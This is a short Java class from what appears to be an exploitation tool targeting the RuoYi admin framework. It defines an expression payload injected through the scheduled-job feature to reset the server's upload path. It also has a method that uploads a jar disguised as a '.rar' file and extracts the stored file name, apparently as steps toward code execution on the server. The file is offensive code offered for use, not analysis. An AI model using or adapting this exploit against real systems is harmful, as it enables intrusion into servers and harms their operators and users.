package com.ruoyi.exp;

import com.ruoyi.global.Config;
import com.ruoyi.util.JobUtil;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UploadExp {

    public static String setProfilePayload = "ruoYiConfig.setProfile(\"{uploadPath}\")";

    public static boolean setProfile(String uploadPath) {
        JobUtil.clearLog();
        return JobUtil.expJob(setProfilePayload.replace("{uploadPath}", uploadPath)).isEmpty();
    }

    public static String uploadJar() {
        Pattern filePattern = Pattern.compile("\"fileName\":\"(.*?)\"");
        String resp = Config.upload(Config.uploadUrlPath, "1.rar", Config.jarFile);
        Matcher matcher =  filePattern.matcher(resp);
        if(matcher.find()){
            return matcher.group(1);
        } else {
            return "";
        }
    }
}
